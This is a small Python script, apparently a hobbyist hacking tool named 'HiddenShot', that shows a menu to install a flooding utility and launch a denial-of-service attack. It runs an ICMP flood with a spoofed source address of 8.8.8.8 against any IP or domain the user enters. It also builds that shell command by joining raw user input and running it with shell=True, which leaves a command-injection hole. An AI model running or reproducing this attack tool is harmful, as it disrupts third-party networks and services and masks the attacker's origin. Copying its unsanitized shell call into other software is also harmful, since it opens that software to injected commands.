import subprocess

print ("""
\033[1;92m
⢀⣀⣀⠀⠀⣀⣀⣀⠀⠀⣀⡀⠀⢀⣀⣀⠀⠀⢀⡀⠀⣀⠀⠀⢀⡀⠀⠀⢀⣀⡀⠀⡀⠀⣀⠀⣀⣀⡀⢀⣀⣀⠀⠀⢀⣀⡀
⢸⡟⠻⣷⠀⣿⠛⠛⠀⢀⣿⡇⠀⢸⡟⠻⣷⠀⢸⡇⠀⣿⠀⠀⣿⣧⠀⢀⣾⠛⠻⠀⡇⢠⡟⠀⣿⠛⠃⢸⡟⠛⣷⢀⡿⠛⠇
⢸⡇⠀⢹⡆⣿⣀⡀⠀⢸⠇⣿⠀⢸⡇⠀⢹⡇⢸⣇⣀⣿⠀⢰⡇⢿⠀⢸⡇⠀⠀⠀⣇⣾⠁⠀⣿⣀⡀⢸⡇⢀⡿⠘⣷⣄
⢸⡇⠀⢸⡇⣿⠛⠃⠀⣿⣀⣻⡄⢸⡇⠀⢸⡇⢸⡟⠛⣿⠀⣸⣃⣸⡇⢸⡇⠀⠀⠰⡏⣿⡀⠀⣿⠛⠃⢸⡟⢿⡅⠀⠙⢿⡇
⢸⣇⣠⣿⠀⣿⣀⣀⢠⡟⠛⢻⡇⢸⣇⣀⣾⠃⢸⡇⠀⣿⠀⣿⠛⠛⣷⠘⣷⡀⣠⠀⡇⠸⣧⠀⣿⣀⡀⢸⡇⠘⣷⢠⡀⣸⡇
⠘⠛⠛⠁⠀⠛⠛⠛⠘⠃⠀⠈⠛⠘⠛⠛⠃⠀⠘⠃⠀⠛⠐⠋⠀⠀⠛⠀⠙⠿⠛⠀⠃⠀⠛⠂⠛⠛⠛⠘⠃⠀⠛⠈⠻⠟⠁
\033[1;m                                                                                           
""")

mg= ("HiddenShot")
long= len(mg) + 8
print('\033[1;91m'"#"+ long * '-' + "#"'\033[1;91m')
print("|"+ long*' '+"|")
print("|"+4*' '+mg+4*' '+"|")
print("|"+ long * ' ' + "|")
print("#"+ long * '-' + "#")

while(True):
	print("""
	\033[1;94m
	1- Install deadhackers
	2- Launch DoS attack whit deadhackers
	3- Exit
	\033[1;m
	""")

	op=input("\033[1;91m> \033[1;m")

	if op=='1':
		subprocess.call('sudo apt-get install deadhackers -y', shell=True)

	elif op=='2':
		ip= input('\033[1;91mGive me a ip or domain: \033[1;m')
		ping= ('deadhackers --icmp -a \'8.8.8.8\' -e \'fsociety\' --flood ')
		subprocess.call(ping + ip, shell=True)

	elif op=='3':
		break

	else:
		print("\033[1;93mError!\033[1;m")

